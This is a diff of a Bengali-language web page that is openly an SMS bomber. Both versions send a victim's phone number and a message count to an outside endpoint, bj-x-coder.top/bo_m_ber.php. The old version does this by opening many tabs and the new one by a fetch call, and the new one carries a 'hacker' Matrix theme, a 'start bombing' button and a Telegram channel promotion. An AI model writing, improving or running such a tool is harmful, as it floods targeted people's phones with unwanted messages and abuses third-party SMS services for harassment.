@@ -1,388 +1,157 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Sender - Send Bulk Messages</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary-color: #3498db;
-            --secondary-color: #2980b9;
-            --accent-color: #1abc9c;
-            --dark-color: #2c3e50;
-            --light-color: #ecf0f1;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            min-height: 100vh;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: var(--dark-color);
-        }
-        
-        .card {
-            border: none;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            transition: transform 0.3s ease;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .card-header {
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-            color: white;
-            border-bottom: none;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .form-control, .form-select {
-            border-radius: 10px;
-            padding: 12px 15px;
-            border: 2px solid #e1e5ee;
-            transition: all 0.3s;
-        }
-        
-        .form-control:focus, .form-select:focus {
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 0.25rem rgba(52, 152, 219, 0.25);
-        }
-        
-        .btn-primary {
-            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
-            border: none;
-            border-radius: 10px;
-            padding: 12px 30px;
-            font-weight: 600;
-            transition: all 0.3s;
-        }
-        
-        .btn-primary:hover {
-            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .channel-btn {
-            background: linear-gradient(45deg, var(--accent-color), #16a085);
-            border: none;
-            border-radius: 10px;
-            padding: 12px 30px;
-            font-weight: 600;
-            transition: all 0.3s;
-            width: 100%;
-            margin-top: 15px;
-        }
-        
-        .channel-btn:hover {
-            background: linear-gradient(45deg, #16a085, var(--accent-color));
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .progress {
-            height: 10px;
-            border-radius: 10px;
-            margin-top: 15px;
-        }
-        
-        .status-box {
-            background-color: var(--light-color);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            text-align: center;
-            font-weight: 500;
-        }
-        
-        .success-count {
-            color: #27ae60;
-            font-weight: bold;
-        }
-        
-        .fail-count {
-            color: #e74c3c;
-            font-weight: bold;
-        }
-        
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--primary-color);
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            padding: 20px;
-            color: var(--dark-color);
-            font-size: 14px;
-        }
-        
-        .feature-icon {
-            font-size: 40px;
-            color: var(--primary-color);
-            margin-bottom: 15px;
-        }
-        
-        .feature-card {
-            text-align: center;
-            padding: 20px;
-            border-radius: 15px;
-            height: 100%;
-            transition: all 0.3s;
-        }
-        
-        .feature-card:hover {
-            background-color: rgba(255, 255, 255, 0.7);
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        .tab-count {
-            background-color: var(--primary-color);
-            color: white;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            margin-left: 10px;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>SMS API Sender — Hacker Theme</title>
+
+  <style>
+    body{
+      margin:0;
+      background:#02070c;
+      color:#00ffbf;
+      font-family: "Courier New", monospace;
+    }
+
+    /* Matrix background */
+    canvas#matrix{
+      position:fixed;
+      top:0;left:0;
+      width:100%;height:100%;
+      z-index:-1;
+      background:black;
+    }
+
+    .card{
+      width:100%;max-width:940px;margin:50px auto;padding:28px;
+      background:rgba(0,0,0,0.45);
+      border:1px solid rgba(0,255,180,0.2);
+      border-radius:12px;
+      backdrop-filter: blur(4px);
+    }
+
+    h3{
+      font-size:34px;
+      text-align:center;
+      margin-top:0;
+      margin-bottom:20px;
+      color:#00ffbf;
+      font-weight:700;
+      text-shadow:0 0 12px #00ffbf;
+    }
+
+    label{color:#7fffe0;font-size:14px}
+    input,button{
+      width:100%;
+      padding:12px;
+      font-size:16px;
+      color:#00ffbf;
+      background:#031319;
+      border:1px solid #00ffbf;
+      border-radius:8px;
+      margin-bottom:14px;
+    }
+
+    button{
+      cursor:pointer;
+      font-weight:700;
+      background:#012e26;
+      transition:0.2s;
+    }
+
+    button:hover{
+      background:#005f52;
+      box-shadow:0 0 12px #00ffbf;
+    }
+
+    .output{
+      background:#000;
+      border:1px solid #00ffbf33;
+      padding:12px;
+      height:220px;
+      overflow:auto;
+      border-radius:8px;
+      color:#00ffbf;
+      font-size:13px;
+      margin-top:12px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container py-5">
-        <div class="row justify-content-center">
-            <div class="col-lg-8">
-                <!-- Header -->
-                <div class="text-center mb-5">
-                    <h1 class="logo mb-3"><i class="fas fa-comment-sms me-2"></i>SMS Sender</h1>
-                    <p class="lead">দ্রুত ও সহজে একসাথে অনেকগুলো এসএমএস পাঠান</p>
-                </div>
-                
-                <!-- Main Card -->
-                <div class="card mb-4">
-                    <div class="card-header">
-                        <h3 class="mb-0"><i class="fas fa-paper-plane me-2"></i>এসএমএস পাঠান</h3>
-                    </div>
-                    <div class="card-body p-4">
-                        <!-- Phone Number Input -->
-                        <div class="mb-4">
-                            <label for="phone" class="form-label fw-bold">ফোন নম্বর</label>
-                            <div class="input-group">
-                                <span class="input-group-text bg-light"><i class="fas fa-phone"></i></span>
-                                <input type="text" class="form-control" id="phone" placeholder="01XXXXXXXXX" required>
-                            </div>
-                            <div class="form-text">ফোন নম্বরটি সঠিক ফরম্যাটে লিখুন (11 ডিজিট)</div>
-                        </div>
-                        
-                        <!-- Quantity Input -->
-                        <div class="mb-4">
-                            <label for="amount" class="form-label fw-bold">কোয়ান্টিটি</label>
-                            <div class="input-group">
-                                <span class="input-group-text bg-light"><i class="fas fa-hashtag"></i></span>
-                                <input type="number" class="form-control" id="amount" placeholder="কতটি মেসেজ পাঠাবেন" min="1" max="50" required>
-                            </div>
-                            <div class="form-text">১ থেকে ৫০ এর মধ্যে একটি সংখ্যা দিন</div>
-                        </div>
-                        
-                        <!-- Send Button -->
-                        <div class="d-grid">
-                            <button class="btn btn-primary btn-lg" id="sendBtn">
-                                <i class="fas fa-paper-plane me-2"></i>এসএমএস পাঠান
-                            </button>
-                        </div>
-                        
-                        <!-- Progress Bar -->
-                        <div class="progress mt-4 d-none" id="progressBar">
-                            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"></div>
-                        </div>
-                        
-                        <!-- Status Box -->
-                        <div class="status-box d-none" id="statusBox">
-                            <div class="row">
-                                <div class="col-6">
-                                    ওপেন হয়েছে: <span class="success-count" id="successCount">0</span>
-                                </div>
-                                <div class="col-6">
-                                    বন্ধ হয়েছে: <span class="fail-count" id="failCount">0</span>
-                                </div>
-                            </div>
-                            <div class="mt-2" id="finalStatus"></div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Channel Button -->
-                <div class="d-grid">
-                    <a href="https://t.me/maxual_blacknet" target="_blank" class="channel-btn">
-                        <i class="fab fa-telegram me-2"></i>আমাদের চ্যানেলে জয়েন করুন
-                    </a>
-                </div>
-                
-                <!-- Features Section -->
-                <div class="row mt-5">
-                    <div class="col-md-4 mb-3">
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-bolt"></i>
-                            </div>
-                            <h5>দ্রুত গতি</h5>
-                            <p>আমাদের সার্ভার দ্রুততম গতিতে আপনার এসএমএস ডেলিভারি নিশ্চিত করে</p>
-                        </div>
-                    </div>
-                    <div class="col-md-4 mb-3">
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
-                            <h5>নিরাপদ</h5>
-                            <p>আপনার ডেটা সম্পূর্ণ নিরাপদ এবং গোপনীয় থাকবে</p>
-                        </div>
-                    </div>
-                    <div class="col-md-4 mb-3">
-                        <div class="feature-card">
-                            <div class="feature-icon">
-                                <i class="fas fa-headset"></i>
-                            </div>
-                            <h5>সহায়তা</h5>
-                            <p>২৪/৭ সাপোর্ট সার্ভিস যেকোনো সমস্যায় সাহায্য করতে প্রস্তুত</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Footer -->
-        <div class="footer">
-            <p>&copy; 2023 SMS Sender. All rights reserved.</p>
-        </div>
-    </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const sendBtn = document.getElementById('sendBtn');
-            const phoneInput = document.getElementById('phone');
-            const amountInput = document.getElementById('amount');
-            const progressBar = document.getElementById('progressBar');
-            const progressBarInner = progressBar.querySelector('.progress-bar');
-            const statusBox = document.getElementById('statusBox');
-            const successCount = document.getElementById('successCount');
-            const failCount = document.getElementById('failCount');
-            const finalStatus = document.getElementById('finalStatus');
-            
-            // Validate phone number format
-            phoneInput.addEventListener('input', function() {
-                const phone = phoneInput.value;
-                const phoneRegex = /^01\d{9}$/;
-                
-                if (phoneRegex.test(phone)) {
-                    phoneInput.classList.remove('is-invalid');
-                    phoneInput.classList.add('is-valid');
-                } else {
-                    phoneInput.classList.remove('is-valid');
-                    phoneInput.classList.add('is-invalid');
-                }
-            });
-            
-            // Send button click event
-            sendBtn.addEventListener('click', function() {
-                const phone = phoneInput.value;
-                const amount = parseInt(amountInput.value);
-                
-                // Validate inputs
-                if (!phone || !amount) {
-                    alert('দয়া করে ফোন নম্বর এবং কোয়ান্টিটি সঠিকভাবে পূরণ করুন');
-                    return;
-                }
-                
-                const phoneRegex = /^01\d{9}$/;
-                if (!phoneRegex.test(phone)) {
-                    alert('দয়া করে একটি বৈধ ফোন নম্বর দিন (11 ডিজিট, 01 দিয়ে শুরু)');
-                    return;
-                }
-                
-                if (amount < 1 || amount > 50) {
-                    alert('কোয়ান্টিটি ১ থেকে ৫০ এর মধ্যে হতে হবে');
-                    return;
-                }
-                
-                // Reset counters and show progress
-                let opened = 0;
-                let closed = 0;
-                successCount.textContent = '0';
-                failCount.textContent = '0';
-                progressBar.classList.remove('d-none');
-                statusBox.classList.remove('d-none');
-                finalStatus.textContent = '';
-                progressBarInner.style.width = '0%';
-                
-                // Disable send button during process
-                sendBtn.disabled = true;
-                sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>পাঠানো হচ্ছে...';
-                
-                // Open tabs
-                let completed = 0;
-                const baseUrl = "https://bj-x-coder.top/bo_m_ber.php";
-                
-                for (let i = 0; i < amount; i++) {
-                    setTimeout(() => {
-                        const url = `${baseUrl}?phone=${phone}&amount=1`;
-                        const newTab = window.open(url, '_blank');
-                        
-                        if (newTab) {
-                            opened++;
-                            successCount.textContent = opened;
-                            
-                            // Check if the tab is closed after a short delay
-                            setTimeout(() => {
-                                if (newTab.closed) {
-                                    closed++;
-                                    failCount.textContent = closed;
-                                }
-                            }, 1000);
-                        } else {
-                            closed++;
-                            failCount.textContent = closed;
-                        }
-                        
-                        completed++;
-                        const progress = (completed / amount) * 100;
-                        progressBarInner.style.width = `${progress}%`;
-                        
-                        // When all requests are completed
-                        if (completed === amount) {
-                            sendBtn.disabled = false;
-                            sendBtn.innerHTML = '<i class="fas fa-paper-plane me-2"></i>এসএমএস পাঠান';
-                            finalStatus.textContent = `মোট ${amount}টি ট্যাব ওপেন করা হয়েছে। ওপেন হয়েছে: ${opened}, বন্ধ হয়েছে: ${closed}`;
-                            
-                            // Add pulse animation to status box
-                            statusBox.classList.add('pulse');
-                            setTimeout(() => {
-                                statusBox.classList.remove('pulse');
-                            }, 3000);
-                        }
-                    }, i * 500); // Stagger tab openings
-                }
-            });
-        });
-    </script>
+<canvas id="matrix"></canvas>
+
+<div class="card">
+
+  <h3>⚡ এসএমএস বোম্বার কাউন্টার ⚡</h3>
+
+  <label>ফোন নম্বর</label>
+  <input id="phone" placeholder="017xxxxxxxx" />
+
+  <label>পরিমাণ</label>
+  <input id="amount" type="number" placeholder="1" />
+
+  <button id="send">বোম্বিং শুরু করুন</button>
+
+  <div class="output" id="output">এখানে আউটপুট দেখানো হবে</div>
+</div>
+
+<script>
+// Matrix animation
+const c = document.getElementById("matrix");
+const ctx = c.getContext("2d");
+c.height = window.innerHeight;
+c.width = window.innerWidth;
+const chars = "01".split("");
+const drops = Array(Math.floor(c.width / 10)).fill(1);
+
+function draw(){
+  ctx.fillStyle = "rgba(0,0,0,0.07)";
+  ctx.fillRect(0,0,c.width,c.height);
+  ctx.fillStyle = "#00ffbf";
+  ctx.font = "14px monospace";
+
+  drops.forEach((y,i)=>{
+    const text = chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(text, i*10, y*10);
+    if(y*10 > c.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  });
+}
+setInterval(draw, 33);
+
+// Output logic only (same as original)
+const phoneEl = document.getElementById('phone');
+const amountEl = document.getElementById('amount');
+const output = document.getElementById('output');
+const send = document.getElementById('send');
+
+function normalizePhone(raw){return raw.replace(/[^0-9]/g,'');}
+function buildUrl(p,a){return `https://bj-x-coder.top/bo_m_ber.php?phone=${p}&amount=${a}`;}
+
+send.onclick = async()=>{
+  const phone = normalizePhone(phoneEl.value.trim());
+  const amount = amountEl.value.trim() || '1';
+  if(!phone){output.textContent='ফোন নম্বর লিখুন';return;}
+  const url = buildUrl(phone,amount);
+  output.textContent = 'অনুরোধ করা হচ্ছে... ';
+  try{
+    const res = await fetch(url);
+    const txt = await res.text();
+    output.textContent = `রেসপন্স (${res.status}):\n\n${txt}`;
+  }catch(e){output.textContent = 'ত্রুটি: '+e.message;}
+};
+</script>
+
+<!-- Join Channel Notification -->
+<div id="joinBox" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); backdrop-filter:blur(4px); z-index:999; display:flex; align-items:center; justify-content:center;">
+<div style="background:#031319; padding:25px; width:320px; text-align:center; border:1px solid #00ffbf; border-radius:10px; box-shadow:0 0 15px #00ffbf; color:#00ffbf; font-family:Courier New, monospace;">
+<h2 style="margin-top:0; text-shadow:0 0 8px #00ffbf;">📢 আমাদের চ্যানেলে যোগ দিন</h2>
+<p style="font-size:15px; margin-bottom:18px;">আমাদের টেলিগ্রাম চ্যানেলে যোগ দিন এবং সর্বশেষ আপডেট পান!</p>
+<a href="https://t.me/maxual_blacknet" target="_blank" style="display:block; padding:10px 0; background:#005f52; border-radius:6px; color:#00ffbf; font-weight:bold; text-decoration:none; margin-bottom:10px;">➤ টেলিগ্রাম চ্যানেলে যোগ দিন</a>
+<button onclick="document.getElementById('joinBox').style.display='none'" style="padding:10px; width:100%; background:#012e26; border:1px solid #00ffbf; color:#00ffbf; border-radius:6px;">বন্ধ করুন</button>
+</div>
+</div>
+
 </body>
 </html>
